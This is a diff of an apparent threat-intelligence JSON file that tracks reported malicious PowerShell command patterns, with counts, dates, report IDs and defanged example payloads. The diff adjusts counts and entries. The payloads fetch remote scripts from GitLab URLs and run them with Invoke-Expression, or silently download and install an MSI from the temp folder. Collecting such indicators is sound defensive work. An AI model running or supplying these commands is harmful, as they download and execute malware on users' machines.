@@ -721,12 +721,11 @@
   },
   {
     "Pattern": "IRM <URL> | IEX",
-    "DistinctPayloadCount": 9,
+    "DistinctPayloadCount": 8,
     "ReportCount": 62,
-    "FirstSeen": "2026-11-12T19:22:14.096000+00:00",
-    "LastSeen": "2026-11-19T17:12:50.058000+00:00",
+    "FirstSeen": "2026-11-13T05:58:18.016000+00:00",
+    "LastSeen": "2026-11-19T19:17:02.747000+00:00",
     "ReportIds": [
-      "cmwdxprc105rj0omlyy2rxdia",
       "cmwekfqsd0ciq0omld5n99u1h",
       "cmwexnoie0eja0omldix6i9jb",
       "cmwexo9xr0ek40oml2mly4u7g",
@@ -787,12 +786,12 @@
       "cmwng99ob1wci0oml88ub4z4y",
       "cmwnt2anm1x7q0omlytin6ijo",
       "cmwnt3ci91x980omlku572i93",
-      "cmwnt6b7q1xan0omlwi7e71xm"
+      "cmwnt6b7q1xan0omlwi7e71xm",
+      "cmwnxm1t71xj30oml4e26u03q"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
       "IRM gitlab[.]com/amber-ffa-f15a6b/4a27-e3b8-4863-8d49-fc408649faef/-/raw/main/d9-4f53-8f7a-6a6104bff2af | IEX",
-      "IRM gitlab[.]com/amber-ffa-f15a6b/b788-40ef-9a42-abc325898912/-/raw/main/9fd-a6c523a5e801 | IEX",
       "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
       "IRM gitlab[.]com/cc4b6f224188/4495be-a229-4a88-ab68-d0b50dfe86b4/-/raw/main/E53-a76F-3c3D6f99 | IEX",
       "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
@@ -877,11 +876,10 @@
   {
     "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 22,
-    "FirstSeen": "2026-11-12T19:21:49.887000+00:00",
+    "ReportCount": 21,
+    "FirstSeen": "2026-11-13T00:04:20.730000+00:00",
     "LastSeen": "2026-11-17T20:46:15.496000+00:00",
     "ReportIds": [
-      "cmwdxp8ne05qu0omlyd8d0l2n",
       "cmwe7sk0008dh0omlccbh502j",
       "cmwe81gep08kc0omlw78d528q",
       "cmwe8utpz09hc0omldgg04ffd",
